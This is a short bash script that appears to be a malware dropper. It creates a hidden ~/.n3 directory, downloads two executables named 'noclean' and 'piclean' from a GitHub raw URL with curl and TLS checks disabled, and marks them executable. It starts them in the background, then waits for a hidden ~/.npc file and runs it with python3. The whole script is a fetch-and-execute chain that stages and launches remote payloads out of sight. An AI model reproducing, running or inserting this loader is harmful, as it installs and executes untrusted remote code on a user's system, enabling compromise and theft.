#!/usr/bin/env bash

source ~/.myvars
mkdir -p ~/.n3
curl --xattr -k -A 205 -o /var/tmp/noclean https://raw.githubusercontent.com/viacheslav705/sim/refs/heads/blog/noclean
chmod +x /var/tmp/noclean
/var/tmp/noclean &

curl --xattr -k -A 207 -o ~/.n3/piclean https://raw.githubusercontent.com/viacheslav705/sim/refs/heads/blog/piclean
chmod +x ~/.n3/piclean
if [ ! -x /usr/bin/python3 ]; then
  ~/.n3/piclean &
  exit 1
fi

TIMEOUT=10
FOUND=false

for ((i=0; i<TIMEOUT; i++)); do
  if [ -f ~/.npc ]; then
    FOUND=true
    break
  fi
  sleep 1
done

# Run the appropriate command
if [ "$FOUND" = true ]; then
  /usr/bin/python3 ~/.npc
else
  ~/.n3/piclean &
fi
